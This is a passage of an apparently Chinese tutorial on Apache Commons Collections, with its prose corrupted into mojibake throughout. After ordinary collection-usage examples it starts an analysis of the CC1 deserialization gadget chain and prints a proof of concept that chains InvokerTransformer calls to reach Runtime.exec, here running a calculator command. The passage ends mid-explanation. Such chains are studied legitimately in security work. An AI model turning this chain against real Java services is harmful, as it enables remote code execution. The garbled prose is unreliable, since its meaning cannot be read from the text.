APIæä¾›äº†ç›¸å½“å¥½çš„è¡¥å……ã€‚åœ¨æ­¤åŸºç¡€ä¸Šå¯¹å…¶å¸¸ç”¨çš„æ•°æ®ç»“æ„æ“ä½œè¿›è¡Œäº†å¾ˆå¥½çš„å°è£…ã€æŠ½è±¡å’Œè¡¥å……ã€‚è®©æˆ‘ä»¬åœ¨å¼€å‘åº”ç”¨ç¨‹åºçš„è¿‡ç¨‹ä¸­ï¼Œæ—¢ä¿è¯äº†æ€§èƒ½ï¼ŒåŒæ—¶ä¹Ÿèƒ½å¤§å¤§ç®€åŒ–ä»£ç ã€‚ ä¸»è¦ç‰¹ç‚¹ Commons Collections çš„ä¸»è¦ç‰¹ç‚¹å¦‚ä¸‹ - Bag - Bag æ¥å£ç®€åŒ–äº†æ¯ä¸ªå¯¹è±¡å…·æœ‰å¤šä¸ªå‰¯æœ¬çš„é›†åˆã€‚ BidiMap- BidiMap æ¥å£æä¾›åŒå‘æ˜ å°„ï¼Œå¯ç”¨äºä½¿ç”¨é”®æˆ–é”®ä½¿ç”¨çš„å€¼æ¥æŸ¥æ‰¾å€¼ã€‚ MapIterator - MapIterator æ¥å£ä¸ºæ˜ å°„æä¾›äº†ç®€å•å’Œæ˜“äºè¿­ä»£æ–¹æ³•ã€‚ è½¬æ¢è£…é¥°å™¨ - è½¬æ¢è£…é¥°å™¨ (Transforming Decorators) å¯ä»¥åœ¨é›†åˆæ·»åŠ åˆ°é›†åˆæ—¶æ”¹å˜é›†åˆçš„æ¯ä¸ªå¯¹è±¡ã€‚ å¤åˆé›†åˆ - å¤åˆé›†åˆç”¨äºè¦æ±‚ç»Ÿä¸€å¤„ç†å¤šä¸ªé›†åˆçš„æƒ…å†µã€‚ æœ‰åºæ˜ å°„ - æœ‰åºæ˜ å°„ä¿ç•™å…ƒç´ æ·»åŠ çš„é¡ºåºã€‚ æœ‰åºé›† - æœ‰åºé›†ä¿ç•™å…ƒç´ æ·»åŠ çš„é¡ºåºã€‚ å‚è€ƒæ˜ å°„ - å‚è€ƒæ˜ å°„å…è®¸åœ¨å¯†åˆ‡æ§åˆ¶ä¸‹å¯¹é”® / å€¼è¿›è¡Œåƒåœ¾æ”¶é›†ã€‚ æ¯”è¾ƒå™¨å®ç° - è®¸å¤šæ¯”è¾ƒå™¨å®ç°éƒ½å¯ç”¨ã€‚ è¿­ä»£å™¨å®ç° - è®¸å¤šè¿­ä»£å™¨å®ç°éƒ½å¯ç”¨ã€‚ é€‚é…å™¨ç±» - é€‚é…å™¨ç±»å¯ç”¨äºå°†æ•°ç»„å’Œæšä¸¾è½¬æ¢ä¸ºé›†åˆã€‚ å®ç”¨ç¨‹åº - å®ç”¨ç¨‹åºå¯ç”¨äºæµ‹è¯•æµ‹è¯•æˆ–åˆ›å»ºé›†åˆçš„å…¸å‹é›†åˆç†è®ºå±æ€§ï¼Œå¦‚è”åˆï¼Œäº¤é›†ã€‚ æ”¯æŒå…³é—­ã€‚ åŒ…ç»“æ„ä»‹ç» Commons Collectionsçš„æœ€æ–°ç‰ˆæ˜¯4.x (commons-collections4)ï¼Œä½†ç”±äºå·¥ä½œä¸­å¤§å¤šè¿˜æ˜¯3.xçš„ç‰ˆæœ¬ï¼Œè¿™é‡Œå°±ä»¥3.xä¸­çš„æœ€åä¸€ä¸ªç‰ˆæœ¬3.2.2ä½œä½¿ç”¨ä»‹ç»ã€‚ ä»¥ä¸‹æ˜¯Collectionsçš„åŒ…ç»“æ„å’Œç®€å•ä»‹ç»ï¼Œå¦‚æœä½ æƒ³äº†è§£æ›´å¤šçš„å„ä¸ªåŒ…ä¸‹çš„æ¥å£å’Œå®ç°ï¼Œè¯·å‚è€ƒApache Commons Collections 3.2.2 APIæ–‡æ¡£ã€‚ org.apache.commons.collections â€“ CommonsCollectionsè‡ªå®šä¹‰çš„ä¸€ç»„å…¬ç”¨çš„æ¥å£å’Œå·¥å…·ç±» org.apache.commons.collections.bag â€“ å®ç°Bagæ¥å£çš„ä¸€ç»„ç±» org.apache.commons.collections.bidimap â€“ å®ç°BidiMapç³»åˆ—æ¥å£çš„ä¸€ç»„ç±» org.apache.commons.collections.buffer â€“ å®ç°Bufferæ¥å£çš„ä¸€ç»„ç±» org.apache.commons.collections.collection â€“å®ç°java.util.Collectionæ¥å£çš„ä¸€ç»„ç±» org.apache.commons.collections.comparatorsâ€“ å®ç°java.util.Comparatoræ¥å£çš„ä¸€ç»„ç±» org.apache.commons.collections.functors â€“Commons Collectionsè‡ªå®šä¹‰çš„ä¸€ç»„åŠŸèƒ½ç±» org.apache.commons.collections.iterators â€“ å®ç°java.util.Iteratoræ¥å£çš„ä¸€ç»„ç±» org.apache.commons.collections.keyvalue â€“ å®ç°é›†åˆå’Œé”®/å€¼æ˜ å°„ç›¸å…³çš„ä¸€ç»„ç±» org.apache.commons.collections.list â€“ å®ç°java.util.Listæ¥å£çš„ä¸€ç»„ç±» org.apache.commons.collections.map â€“ å®ç°Mapç³»åˆ—æ¥å£çš„ä¸€ç»„ç±» org.apache.commons.collections.set â€“ å®ç°Setç³»åˆ—æ¥å£çš„ä¸€ç»„ç±» å¼•å…¥ä¾èµ– commons-collections commons-collections 3.2.2 ä½¿ç”¨ä»‹ç» é€šç”¨é›†åˆ Bag Bag æ¥å£å®šä¹‰äº†ä¸€ä¸ªé›†åˆï¼Œå®ƒå¯ä»¥è®¡ç®—ä¸€ä¸ªå¯¹è±¡å‡ºç°åœ¨é›†åˆä¸­çš„æ¬¡æ•°ã€‚ package org.example; import org.apache.commons.collections.Bag; import org.apache.commons.collections.bag.HashBag; public class App{ public static void main(String[] args) { Bag bag = new HashBag(); bag.add(\"a\", 2); bag.add(\"b\"); bag.add(\"c\"); bag.add(\"c\"); System.out.println(bag); // [2:a,1:b,2:c] System.out.println(bag.getCount(\"c\")); // 2 System.out.println(bag.uniqueSet()); // [a, b, c] bag.remove(\"a\", 1); System.out.println(bag); // [1:a,1:b,2:c] } } é€šç”¨é›†åˆ BidiMap BidiMap æ¥å£è¢«æ·»åŠ åˆ°æ”¯æŒåŒå‘æ˜ å°„ã€‚ ä½¿ç”¨åŒå‘æ˜ å°„ï¼Œå¯ä»¥ä½¿ç”¨å€¼æŸ¥æ‰¾é”®ï¼Œå¹¶ä¸”å¯ä»¥ä½¿ç”¨é”®è½»æ¾æŸ¥æ‰¾å€¼ã€‚ package org.example; import org.apache.commons.collections.BidiMap; import org.apache.commons.collections.bidimap.TreeBidiMap; public class App { public static void main(String[] args) { BidiMap bidiMap = new TreeBidiMap(); bidiMap.put(\"a\", \"b\"); bidiMap.put(\"c\", \"d\"); System.out.println(bidiMap); // {a=b, c=d} System.out.println(bidiMap.get(\"a\")); // b System.out.println(bidiMap.getKey(\"b\")); // a System.out.println(bidiMap.inverseBidiMap()); // {b=a, d=c} bidiMap.remove(\"a\"); System.out.println(bidiMap); // {c=d} } } é€šç”¨é›†åˆ MapIterator JDK Map æ¥å£å¾ˆéš¾ä½œä¸ºè¿­ä»£åœ¨ EntrySet æˆ– KeySet å¯¹è±¡ä¸Šè¿­ä»£ã€‚ MapIterator æä¾›äº†å¯¹ Map çš„ç®€å•è¿­ä»£ã€‚ package org.example; import org.apache.commons.collections.IterableMap; import org.apache.commons.collections.MapIterator; import org.apache.commons.collections.map.HashedMap; public class App { public static void main(String[] args) { IterableMap iterableMap = new HashedMap(); iterableMap.put(\"a\", \"b\"); iterableMap.put(\"c\", \"d\"); iterableMap.put(\"e\", \"F\"); MapIterator mapIterator = iterableMap.mapIterator(); while (mapIterator.hasNext()){ Object key = mapIterator.next(); Object value = mapIterator.getValue(); System.out.println(\"key: \" + key); // key: a System.out.println(\"value: \" + value); // value: b mapIterator.setValue(value + \"TEST\"); } System.out.println(iterableMap); // {a=bTEST, c=dTEST, e=FTEST} } } é€šç”¨é›†åˆ OrderedMap OrderedMap æ˜¯æ˜ å°„çš„æ–°æ¥å£ï¼Œç”¨äºä¿ç•™æ·»åŠ å…ƒç´ çš„é¡ºåºã€‚ LinkedMap å’Œ ListOrderedMap æ˜¯ä¸¤ç§å¯ç”¨çš„å®ç°ã€‚ æ­¤æ¥å£æ”¯æŒ Map çš„è¿­ä»£å™¨ï¼Œå¹¶å…è®¸åœ¨ Map ä¸­å‘å‰æˆ–å‘åä¸¤ä¸ªæ–¹å‘è¿›è¡Œè¿­ä»£ã€‚ package org.example; import org.apache.commons.collections.OrderedMap; import org.apache.commons.collections.map.LinkedMap; public class App { public static void main(String[] args) { OrderedMap map = new LinkedMap(); map.put(\"a\", \"b\"); map.put(\"C\", \"D\"); System.out.println(map.firstKey()); // a System.out.println(map.lastKey()); // C System.out.println(map.nextKey(\"a\")); // C System.out.println(map.previousKey(\"C\")); // a } } é›†åˆå·¥å…·ç±» CollectionUtils Apache Commons Collections åº“çš„ CollectionUtils ç±»æä¾›å„ç§å®ç”¨æ–¹æ³•ï¼Œç”¨äºè¦†ç›–å¹¿æ³›ç”¨ä¾‹çš„å¸¸è§æ“ä½œã€‚ å®ƒæœ‰åŠ©äºé¿å…ç¼–å†™æ ·æ¿ä»£ç ã€‚ è¿™ä¸ªåº“åœ¨ jdk 8 ä¹‹å‰æ˜¯éå¸¸æœ‰ç”¨çš„ï¼Œä½†ç°åœ¨ Java 8 çš„ Stream API æä¾›äº†ç±»ä¼¼çš„åŠŸèƒ½ã€‚ æ£€æŸ¥æ˜¯å¦ä¸ºç©ºå…ƒç´  CollectionUtils çš„ addIgnoreNull() æ–¹æ³•å¯ç”¨äºç¡®ä¿åªæœ‰éç©º (null) å€¼è¢«æ·»åŠ åˆ°é›†åˆä¸­ã€‚ è¿”å›å€¼ï¼šå¦‚æœé›†åˆå·²æ›´æ”¹ï¼Œåˆ™è¿”å›ä¸º Trueã€‚ List list = new LinkedList(); boolean result1 = CollectionUtils.addIgnoreNull(list, null); System.out.println(result1); // false boolean result2 = CollectionUtils.addIgnoreNull(list, \"a\"); System.out.println(result2); // true System.out.println(list); // [a] System.out.println(list.contains(null)); // false list.add(null); System.out.println(list); // [a, null] System.out.println(list.contains(null)); // true åˆå¹¶ä¸¤ä¸ªæ’åºåˆ—è¡¨ CollectionUtils çš„ collate() æ–¹æ³•å¯ç”¨äºåˆå¹¶ä¸¤ä¸ªå·²æ’åºçš„åˆ—è¡¨ã€‚ è¿”å›å€¼ï¼šä¸€ä¸ªæ–°çš„æ’åºåˆ—è¡¨ï¼Œå…¶ä¸­åŒ…å«é›†åˆ a å’Œ b çš„å…ƒç´ ã€‚ List sortedList1 = Arrays.asList(\"A\", \"C\", \"E\"); List sortedList2 = Arrays.asList(\"B\", \"D\", \"F\"); List mergedList = CollectionUtils.collate(sortedList1, sortedList2); System.out.println(mergedList); // [A, B, C, D, E, F] è½¬æ¢åˆ—è¡¨ CollectionUtils çš„ collect() æ–¹æ³•å¯ç”¨äºå°†ä¸€ç§ç±»å‹çš„å¯¹è±¡åˆ—è¡¨è½¬æ¢ä¸ºä¸åŒç±»å‹çš„å¯¹è±¡åˆ—è¡¨ã€‚ è¿”å›å€¼ï¼šè½¬æ¢ç»“æœ (æ–°åˆ—è¡¨)ã€‚ List stringList = Arrays.asList(\"1\", \"2\", \"3\"); List integerList = (List) CollectionUtils.collect(stringList, new Transformer() { @Override public Integer transform(String input) { return Integer.parseInt(input); } }); System.out.println(integerList); // [1, 2, 3] è¿‡æ»¤åˆ—è¡¨ CollectionUtils çš„ filter() æ–¹æ³•å¯ç”¨äºè¿‡æ»¤åˆ—è¡¨ä»¥ç§»é™¤ä¸æ»¡è¶³ç”±è°“è¯ä¼ é€’æä¾›çš„æ¡ä»¶çš„å¯¹è±¡ã€‚ è¿”å›å€¼ï¼šå¦‚æœé€šè¿‡æ­¤è°ƒç”¨ä¿®æ”¹äº†é›†åˆï¼Œåˆ™è¿”å› trueï¼Œå¦åˆ™è¿”å› falseã€‚ List integerList = new ArrayList(); integerList.addAll(Arrays.asList(1, 2, 3, 4, 5, 6, 7, 8)); System.out.println(integerList); // [1, 2, 3, 4, 5, 6, 7, 8] CollectionUtils.filter(integerList, new Predicate() { @Override public boolean evaluate(Integer input) { if (input.intValue() % 2 == 0) { return true; } return false; } }); System.out.println(integerList); // [2, 4, 6, 8] æ£€æŸ¥éç©ºåˆ—è¡¨ CollectionUtils çš„ isNotEmpty() æ–¹æ³•å¯ç”¨äºæ£€æŸ¥åˆ—è¡¨æ˜¯å¦ä¸º null è€Œä¸ç”¨æ‹…å¿ƒ null åˆ—è¡¨ã€‚ å› æ­¤ï¼Œåœ¨æ£€æŸ¥åˆ—è¡¨å¤§å°ä¹‹å‰ï¼Œä¸éœ€è¦å°†æ— æ•ˆæ£€æŸ¥æ”¾åœ¨ä»»ä½•åœ°æ–¹ã€‚ è¿”å›å€¼ï¼šå¦‚æœéç©ºä¸”é nullï¼Œåˆ™è¿”å›ä¸º:trueã€‚ æ£€æŸ¥ç©ºçš„åˆ—è¡¨ CollectionUtils çš„ isEmpty() æ–¹æ³•å¯ç”¨äºæ£€æŸ¥åˆ—è¡¨æ˜¯å¦ä¸ºç©ºã€‚ è¿”å›å€¼ï¼šå¦‚æœä¸ºç©ºæˆ–ä¸º nullï¼Œåˆ™è¿”å›ä¸º trueã€‚ æ£€æŸ¥å­åˆ—è¡¨ CollectionUtils çš„ isSubCollection () æ–¹æ³•å¯ç”¨äºæ£€æŸ¥é›†åˆæ˜¯å¦åŒ…å«ç»™å®šé›†åˆã€‚ å‚æ•° a - ç¬¬ä¸€ä¸ª (å­) é›†åˆä¸èƒ½ä¸ºç©ºã€‚ b - ç¬¬äºŒä¸ª (è¶…é›†) é›†åˆä¸èƒ½ä¸ºç©ºã€‚ å½“ä¸”ä»…å½“ a æ˜¯ b çš„å­é›†åˆæ—¶æ‰ä¸º trueã€‚ æ£€æŸ¥ç›¸äº¤ CollectionUtils çš„ intersection() æ–¹æ³•å¯ç”¨äºè·å–ä¸¤ä¸ªé›†åˆ (äº¤é›†) ä¹‹é—´çš„å…¬å…±å¯¹è±¡éƒ¨åˆ†ã€‚ å‚æ•° a - ç¬¬ä¸€ä¸ª (å­) é›†åˆä¸èƒ½ä¸º nullã€‚ b - ç¬¬äºŒä¸ª (è¶…é›†) é›†åˆä¸èƒ½ä¸º nullã€‚ è¿”å›å€¼ï¼šä¸¤ä¸ªé›†åˆçš„äº¤é›†ã€‚ æ±‚å·®é›† CollectionUtils çš„ subtract() æ–¹æ³•å¯ç”¨äºé€šè¿‡ä»å…¶ä»–é›†åˆä¸­å‡å»ä¸€ä¸ªé›†åˆçš„å¯¹è±¡æ¥è·å–æ–°é›†åˆã€‚ å‚æ•° a - è¦ä»ä¸­å‡å»çš„é›†åˆï¼Œä¸èƒ½ä¸º nullã€‚ b - è¦å‡å»çš„é›†åˆï¼Œä¸èƒ½ä¸º nullã€‚ è¿”å›å€¼ï¼šä¸¤ä¸ªé›†åˆçš„å·®é›† (æ–°é›†åˆ)ã€‚ æ±‚è”åˆé›† CollectionUtils çš„ union() æ–¹æ³•å¯ç”¨äºè·å–ä¸¤ä¸ªé›†åˆçš„è”åˆã€‚ å‚æ•° a - ç¬¬ä¸€ä¸ªé›†åˆï¼Œä¸èƒ½ä¸º nullã€‚ b - ç¬¬äºŒä¸ªé›†åˆï¼Œä¸èƒ½ä¸º nullã€‚ è¿”å›å€¼ï¼šä¸¤ä¸ªé›†åˆçš„è”åˆã€‚ å‚è€ƒæ•™ç¨‹ Apache Commons Collectionsæ•™ç¨‹ Commons Collections1 åˆ†æ å‰è¨€ Commons Collectionsçš„åˆ©ç”¨é“¾ä¹Ÿè¢«ç§°ä¸ºccé“¾ï¼Œåœ¨å­¦ä¹ ååºåˆ—åŒ–æ¼æ´å¿…ä¸å¯å°‘çš„ä¸€ä¸ªéƒ¨åˆ†ã€‚ Apache Commons Collectionsæ˜¯Javaä¸­åº”ç”¨å¹¿æ³›çš„ä¸€ä¸ªåº“ï¼ŒåŒ…æ‹¬Weblogicã€JBossã€WebSphereã€Jenkinsç­‰çŸ¥åå¤§å‹Javaåº”ç”¨éƒ½ä½¿ç”¨äº†è¿™ä¸ªåº“ã€‚ å‰ç½®çŸ¥è¯† POCç¤ºä¾‹ å…ˆå¼•å…¥ä¾èµ– commons-collections commons-collections 3.1 ç½‘ä¸Šçš„ä¸€ä¸ªPOCï¼Œå…ˆçœ‹ä¸‹æ¶‰åŠå“ªäº›ç±»ï¼› å› ä¸ºåœ¨è°ƒè¯•è¿™æ¡é“¾çš„æ—¶å€™ä¼šæ¶‰åŠåˆ°ä¸€äº›æ²¡æ¥è§¦è¿‡çš„ç±»ï¼Œåœ¨è°ƒè¯•å‰éœ€è¦äº†è§£åˆ°è¿™äº›ç±»çš„ä¸€ä¸ªä½œç”¨ï¼Œæ–¹ä¾¿åé¢çš„ç†è§£ã€‚ package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.util.HashMap; import java.util.Map; public class App { public static void main(String[] args) { //æ­¤å¤„æ„å»ºäº†ä¸€ä¸ªtransformersçš„æ•°ç»„ï¼Œåœ¨å…¶ä¸­æ„å»ºäº†ä»»æ„å‡½æ•°æ‰§è¡Œçš„æ ¸å¿ƒä»£ç  Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"open -na Calculator\"}) }; //å°†transformersæ•°ç»„å­˜å…¥ChaniedTransformerè¿™ä¸ªç»§æ‰¿ç±» Transformer transformerChain = new ChainedTransformer(transformers); //åˆ›å»ºMapå¹¶ç»‘å®štransformerChina Map innerMap = new HashMap(); innerMap.put(\"value\", \"value\"); //ç»™äºˆmapæ•°æ®è½¬åŒ–é“¾ Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //è§¦å‘æ¼æ´ Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next(); //outerMapåä¸€ä¸²ä¸œè¥¿ï¼Œå…¶å®å°±æ˜¯è·å–è¿™ä¸ªmapçš„ç¬¬ä¸€ä¸ªé”®å€¼å¯¹ï¼ˆvalue,valueï¼‰ï¼›ç„¶åè½¬åŒ–æˆMap.Entryå½¢å¼ï¼Œè¿™æ˜¯mapçš„é”®å€¼å¯¹æ•°æ®æ ¼å¼ onlyElement.setValue(\"foobar\"); } } å…ˆè¿è¡Œä¸‹æŸ¥çœ‹ç»“æœã€‚ æˆåŠŸæ‰§è¡Œäº†ç³»ç»Ÿå‘½ä»¤ã€‚ Transformer Transformeræ˜¯Commons Collectionsä¸­æä¾›çš„ä¸€ä¸ªæ¥å£ï¼Œåªæœ‰ä¸€ä¸ªå¾…å®ç°çš„transformæ–¹æ³•ã€‚ ConstantTransformer ConstantTransformeræ˜¯æ¥å£Transformerçš„å®ç°ç±» å®ƒçš„è¿‡ç¨‹å°±æ˜¯åœ¨æ„é€ å‡½æ•°çš„æ—¶å€™ä¼ â¼Šâ¼€ä¸ªå¯¹è±¡ï¼Œå¹¶åœ¨transformâ½…æ³•å°†è¿™ä¸ªå¯¹è±¡å†è¿”å›ï¼Œå…¶å®å°±æ˜¯åŒ…è£…ä»»æ„â¼€ä¸ªå¯¹è±¡ï¼Œåœ¨æ‰§â¾å›è°ƒæ—¶è¿”å›è¿™ä¸ªå¯¹è±¡ï¼Œè¿›â½½â½…ä¾¿åç»­æ“ä½œã€‚ InvokerTransformerâ€¼ï¸ InvokerTransformerä¹Ÿæ˜¯Transformerçš„å®ç°ç±» åœ¨æ„é€ æ–¹æ³•ä¸­æœ‰ä¸‰ä¸ªå‚æ•° ç¬¬â¼€ä¸ªå‚æ•°æ˜¯å¾…æ‰§â¾çš„â½…æ³•å ç¬¬â¼†ä¸ªå‚æ•°æ˜¯è¿™ä¸ªå‡½æ•°çš„å‚æ•°åˆ—è¡¨çš„å‚æ•°ç±»å‹ ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ä¼ ç»™è¿™ä¸ªå‡½æ•°çš„å‚æ•°åˆ—è¡¨ é‡Œé¢è¿˜æä¾›äº†ä¸€ä¸ªtransformçš„æ–¹æ³•ï¼Œè¯¥æ–¹æ³•å¯ä»¥é€šè¿‡Javaåå°„æœºåˆ¶æ¥è¿›è¡Œæ‰§è¡Œä»»æ„ä»£ç ã€‚ å®ç°ä»£ç ä¸¾ä¾‹ï¼š ä¸èƒ½ç›´æ¥åˆ©ç”¨ ChainedTransformerâ€¼ï¸ ChainedTransformerä¹Ÿæ˜¯å®ç°äº†Transformeræ¥â¼çš„â¼€ä¸ªç±» çœ‹åˆ°transformæ–¹æ³•æ˜¯é€šè¿‡ä¼ å…¥Trasnformer[]æ•°ç»„æ¥å¯¹ä¼ å…¥çš„æ•°å€¼è¿›è¡Œéå†å¹¶ä¸”è°ƒç”¨æ•°ç»„å¯¹è±¡çš„transformæ–¹æ³•ï¼Œå®ƒçš„ä½œâ½¤æ˜¯å°†å†…éƒ¨çš„å¤šä¸ªTransformerä¸²åœ¨â¼€èµ·ã€‚ é€šä¿—æ¥è¯´å°±æ˜¯ï¼Œå‰â¼€ä¸ªå›è°ƒè¿”å›çš„ç»“æœï¼Œä½œä¸ºåâ¼€ä¸ªå›è°ƒçš„å‚æ•°ä¼ â¼Šï¼Œå°†å¤šä¸ªTransformer ç”¨è¿‡ä¾æ¬¡è°ƒç”¨å„è‡ªçš„transform è¿æ¥èµ·æ¥ï¼Œç”¨Pç‰›çš„â¼€ä¸ªå›¾åšç¤ºæ„ï¼š å‡ ä¸ªTransformerå®ç°ç±»æ•´ç† ç†ä¸€ç†è¿™å‡ ä¸ªTransfromerã€‚å…¶å®ä¸€å…±å°±ä¸‰ä¸ªTransformer,è€Œä¸”è¿™äº›XxxTransformeréƒ½æ˜¯å®ç°äº†TransFormerè¿™ä¸ªæ¥å£çš„ï¼Œæ‰€ä»¥ä»–ä»¬éƒ½æœ‰ä¸€ä¸ªtransformæ–¹æ³•: InvokerTransformer ConstantTransformer ChainedTransformer æ„é€ å‡½æ•°æ¥å—ä¸‰ä¸ªå‚æ•° æ„é€ å‡½æ•°æ¥å—ä¸€ä¸ªå‚æ•° æ„é€ å‡½æ•°æ¥å—ä¸€ä¸ªTransFormerç±»å‹çš„æ•°ç»„ transformæ–¹æ³•é€šè¿‡åå°„å¯ä»¥æ‰§è¡Œä¸€ä¸ªå¯¹è±¡çš„ä»»æ„æ–¹æ³• transformè¿”å›æ„é€ å‡½æ•°ä¼ å…¥çš„å‚æ•° transformæ–¹æ³•æ‰§è¡Œæ„é€ å‡½æ•°ä¼ å…¥æ•°ç»„çš„æ¯ä¸€ä¸ªæˆå‘˜çš„transformæ–¹æ³• Map Transformæ¥æ‰§è¡Œå‘½ä»¤éœ€è¦ç»‘å®šåˆ°Mapä¸Šï¼ŒæŠ½è±¡ç±»AbstractMapDecoratoræ˜¯Apache Commons Collectionsæä¾›çš„ä¸€ä¸ªç±»ï¼Œå®ç°ç±»æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚LazyMapã€TransformedMapç­‰ï¼Œè¿™äº›ç±»éƒ½æœ‰ä¸€ä¸ªdecorate()æ–¹æ³•ï¼Œç”¨äºå°†ä¸Šè¿°çš„Transformerå®ç°ç±»ç»‘å®šåˆ°Mapä¸Šï¼Œå½“å¯¹Mapè¿›è¡Œä¸€äº›æ“ä½œæ—¶ï¼Œä¼šè‡ªåŠ¨è§¦å‘Transformerå®ç°ç±»çš„tranform()æ–¹æ³•ï¼Œä¸åŒçš„Mapç±»å‹æœ‰ä¸åŒçš„è§¦å‘è§„åˆ™ã€‚ TransformedMapâ€¼ï¸ TransformedMapè¿™ä¸ªç±»æ˜¯ç”¨æ¥å¯¹Mapè¿›è¡ŒæŸäº›å˜æ¢ï¼ˆä¿®é¥°ï¼‰ç”¨çš„ï¼Œä¾‹å¦‚å½“æˆ‘ä»¬ä¿®æ”¹Mapä¸­çš„æŸä¸ªå€¼æ—¶ï¼Œå°±ä¼šè§¦å‘æˆ‘ä»¬é¢„å…ˆå®šä¹‰å¥½çš„æŸäº›æ“ä½œæ¥å¯¹Mapè¿›è¡Œå¤„ç†ï¼ˆå›è°ƒï¼‰ã€‚ é€šè¿‡decorateå‡½æ•°å°±å¯ä»¥å°†ä¸€ä¸ªæ™®é€šçš„Mapè½¬æ¢ä¸ºä¸€ä¸ªTransformedMapã€‚ç¬¬äºŒä¸ªå‚æ•°å’Œç¬¬ä¸‰ä¸ªå‚æ•°åˆ†åˆ«å¯¹åº”å½“keyæ”¹å˜å’Œvalueæ”¹å˜æ—¶å¯¹åº”transformå‡½æ•°éœ€è¦åšçš„æ“ä½œï¼› ä¸¾ä¸ªä¾‹å­ï¼š package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.TransformedMap; import java.util.HashMap; import java.util.Map; public class App { public static void main(String[] args) { Map hashMap = new HashMap(); hashMap.put(\"1\", \"2\"); // keyä¿®æ”¹æ‰§è¡ŒTestä¸­çš„transformæ–¹æ³•ï¼Œvalueä¿®æ”¹æ‰§è¡ŒTest1ä¸­çš„transformæ–¹æ³• Map transformedMap = TransformedMap.decorate(hashMap, new Test(), new Test1()); // ä¸¤ä¸ªå€¼éƒ½ä¿®æ”¹å°±ä¼šTestå’ŒTest1ä¸­çš„transforméƒ½æ‰§è¡Œ transformedMap.put(\"3\", \"4\"); System.out.println(\"\\n--- åˆ†ç•Œçº¿ ---\\n\"); Map.Entry transformedMapValue = (Map.Entry) transformedMap.entrySet().iterator().next(); // å€¼æ”¹å˜ä¼šæ‰§è¡Œ Test1ç±» ä¸­çš„transformæ–¹æ³• transformedMapValue.setValue(\"5\"); } } class Test implements Transformer { @Override public Object transform(Object o) { System.out.println(\"Test Object: \" + o.toString()); return \"Test Object\"; } } class Test1 implements Transformer { @Override public Object transform(Object o) { System.out.println(\"Test1 Object: \" + o.toString()); return \"Test1 Object\"; } } å³Transformerå®ç°ç±»ï¼ˆå¦‚ChainedTransformerï¼‰åˆ†åˆ«ç»‘å®šåˆ°Mapçš„keyå’Œvalueä¸Šï¼Œå½“mapçš„keyæˆ–valueè¢«ä¿®æ”¹æ—¶ï¼Œä¼šè°ƒç”¨å¯¹åº”Transformerå®ç°ç±»çš„transform()æ–¹æ³•å»è¿›è¡Œä¸€äº›å˜æ¢æ“ä½œã€‚ ä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼Ÿä¸ºä»€ä¹ˆputäº†å°±ä¼šè§¦å‘transformæ–¹æ³•ï¼Ÿ çœ‹ä¸€ä¸‹TransformedMap.putè¿™ä¸ªæ–¹æ³•ï¼Œå‘ç°åœ¨putæ“ä½œçš„æ—¶å€™ï¼Œä¼šç›´æ¥è°ƒç”¨ç±»å‡½æ•°ä¸­çš„transformKeyå’ŒtransformValueå»å¤„ç† ç„¶åè¿™ä¿©ä¸ªç±»å‡½æ•°è¿”å›çš„æ˜¯æˆ‘ä»¬ä¼ å…¥çš„Transformerå®ç°ç±»å»æ‰§è¡Œtransformæ–¹æ³• æ‰€ä»¥æˆ‘ä»¬putäº†è¿‡åå°±è§¦å‘äº†ã€‚ è°ƒç”¨setValueè§¦å‘åŒç†ï¼›TransformedMapé‡Œçš„æ¯ä¸ªentrysetåœ¨è°ƒç”¨setValueæ–¹æ³•æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨TransformedMapç±»çš„checkSetValueæ–¹æ³• æˆ‘ä»¬å¯ä»¥æŠŠchainedtransformerç»‘å®šåˆ°ä¸€ä¸ªTransformedMapä¸Šï¼Œå½“æ­¤mapçš„keyæˆ–valueå‘ç”Ÿæ”¹å˜æ—¶ï¼Œå°±ä¼šè‡ªåŠ¨è§¦å‘chainedtransformerã€‚ Map.Entry Map.Entryæ˜¯Mapçš„ä¸€ä¸ªå†…éƒ¨æ¥å£ã€‚ Map.Entryæ˜¯Mapå£°æ˜çš„ä¸€ä¸ªå†…éƒ¨æ¥å£ï¼Œæ­¤æ¥å£ä¸ºæ³›å‹ï¼Œå®šä¹‰ä¸ºEntryã€‚å®ƒè¡¨ç¤ºMapä¸­çš„ä¸€ä¸ªå®ä½“ï¼ˆä¸€ä¸ªkey-valueå¯¹ï¼‰ã€‚æ¥å£ä¸­æœ‰getKey()ã€getValue()æ–¹æ³•ã€‚ åå°„exec åœ¨Javaä¸­æ‰§è¡Œå‘½ä»¤ä¸€èˆ¬é€šè¿‡Runtime.getRuntime().exec(\"command\")æ¥æ‰§è¡Œå‘½ä»¤ï¼Œå¦‚æœæˆ‘ä»¬æƒ³åœ¨ä¿®æ”¹transformedMapæ—¶æ‰§è¡Œå‘½ä»¤ï¼Œå°±éœ€è¦æ„é€ ä¸€ä¸ªç‰¹æ®Šçš„ChainedTransformeræ¥åå°„å‡ºexecå‡½æ•°ã€‚ åå°„åˆ©ç”¨é“¾ åˆ†æChainedTransformerä¸­çš„transformæ–¹æ³•å¯ä»¥å‘ç°ï¼Œè¿™ä¸ªé“¾ä¸­ï¼Œä¼šå°†ä¸Šä¸€æ¬¡å˜æ¢çš„ç»“æœä½œä¸ºä¸‹ä¸€æ¬¡å˜æ¢çš„è¾“å…¥ï¼Œç›´åˆ°æ‰€æœ‰çš„å˜æ¢å®Œæˆï¼Œå¹¶è¿”å›æœ€ç»ˆçš„object 